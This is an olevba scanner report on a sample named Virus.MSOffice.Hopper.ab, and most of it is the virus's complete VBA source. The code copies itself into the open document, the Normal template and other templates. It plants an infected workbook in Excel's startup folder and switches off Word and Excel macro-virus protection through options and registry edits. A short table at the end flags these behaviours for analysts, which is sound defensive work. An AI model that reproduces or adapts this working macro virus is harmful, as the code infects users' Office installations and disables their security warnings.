olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSOffice.Hopper.ab-94d5a50d50ce9f919545a82166e6a43a376033d1
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: Virus.MSOffice.Hopper.ab-94d5a50d50ce9f919545a82166e6a43a376033d1 - OLE stream: '_VBA_PROJECT_CUR/VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'<!--BEAT-->
'2000-4
Private Sub Document_Close()
    On Error Resume Next
    OfficeVirusProtection
''  DoWordtoItself
    Set nt = NormalTemplate.VBProject.VBComponents(1).CodeModule
    Set TT = Templates(1).VBProject.VBComponents(1).CodeModule
    Set ad = ActiveDocument.VBProject.VBComponents(1).CodeModule
    If ad.Lines(1, 1) <> "'<!--BEAT-->" Then
        ad.DeleteLines 1, ad.CountofLines
        ad.InsertLines 1, TT.Lines(1, TT.CountofLines)
        If ad.Lines(1, 1) <> "'<!--BEAT-->" Then
            ad.InsertLines 1, nt.Lines(1, nt.CountofLines)
        End If
    End If
    If nt.Lines(1, 1) <> "'<!--BEAT-->" Then
        nt.DeleteLines 1, nt.CountofLines
        nt.InsertLines 1, ad.Lines(1, ad.CountofLines)
     End If
        '-------------------
    If TT.Lines(1, 1) <> "'<!--BEAT-->" Then
        TT.DeleteLines 1, TT.CountofLines
        TT.InsertLines 1, nt.Lines(1, nt.CountofLines)
    End If
''    DoWordtoExcel
    Set xlApp = GetObject(, "Excel.Application")
     If xlApp = "" Then
    Set xlApp = CreateObject("Excel.Application")
        WQuit = True
    End If
    '-----------
    If UCase(Dir(xlApp.Application.StartupPath + "\Book1.")) = UCase("BOOK1") Then ''瘻냥댕畇돨俚륜눔
            Kill xlApp.Application.StartupPath + "\Book1."
    End If
    '------------
    Set Book1Obj = xlApp.Workbooks.Add
        Book1Obj.VBProject.VBComponents("ThisWorkbook").CodeModule.InsertLines 1, nt.Lines(1, nt.CountofLines)
        Book1Obj.SaveAs xlApp.Application.StartupPath & "\Book1."
        Book1Obj.Close
        xlApp.Quit
'   ------------------
End Sub

Private Sub Workbook_Deactivate()
    On Error Resume Next
    OfficeVirusProtection
    Set AW = ActiveWorkbook.VBProject.VBComponents("ThisWorkbook").CodeModule
    Set TW = ThisWorkbook.VBProject.VBComponents("ThisWorkbook").CodeModule
        If AW.Lines(1, 1) <> "'<!--BEAT-->" Then
        AW.DeleteLines 1, AW.CountofLines
        AW.InsertLines 1, TW.Lines(1, TW.CountofLines)
    End If
        If TW.Lines(1, 1) <> "'<!--BEAT-->" Then
        TW.DeleteLines 1, TW.CountofLines
        TW.InsertLines 1, AW.Lines(1, TW.CountofLines)
    End If
    '--------------
    Set WordObj = GetObject(, "Word.Application")
     If WordObj = "" Then
    Set WordObj = CreateObject("Word.Application")
        WQuit = True
    End If
    Set nt = WordObj.NormalTemplate.VBProject.VBComponents(1).CodeModule
     If nt.Lines(1, 1) <> "'<!--BEAT-->" Then
        nt.DeleteLines 1, nt.CountofLines
        nt.InsertLines 1, TW.Lines(1, TW.CountofLines)
     End If
    Set nt = Nothing
    If WQuit = True Then WordObj.Quit
End Sub

Private Sub OfficeVirusProtection()
    On Error Resume Next
'''word'VirusProtection
    Set WordObj = GetObject(, "Word.Application")
    If WordObj = "" Then
    Set WordObj = CreateObject("Word.Application")
    WQuit = True
    End If
    Set WdappOp = WordObj.Options
    With WdappOp
        .VirusProtection = False
        .ConfirmConversions = False
        .SaveNormalPrompt = False
    End With
    '''excel'VirusProtection
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel", "Options6") = "0" ' = "Check"
    System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Office\8.0\New User Settings\Excel\Microsoft Excel", "Options6") = "0" '= ""
    System.PrivateProfileString("", "HKEY_USERS\.Default\Software\Microsoft\Office\8.0\Excel\Microsoft Excel", "Options6") = "0" ' = "Whoa"
End Sub

-------------------------------------------------------------------------------
VBA MACRO Sheet1.cls 
in file: Virus.MSOffice.Hopper.ab-94d5a50d50ce9f919545a82166e6a43a376033d1 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet2.cls 
in file: Virus.MSOffice.Hopper.ab-94d5a50d50ce9f919545a82166e6a43a376033d1 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet3.cls 
in file: Virus.MSOffice.Hopper.ab-94d5a50d50ce9f919545a82166e6a43a376033d1 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet3'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|GetObject           |May get an OLE object with a running instance|
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

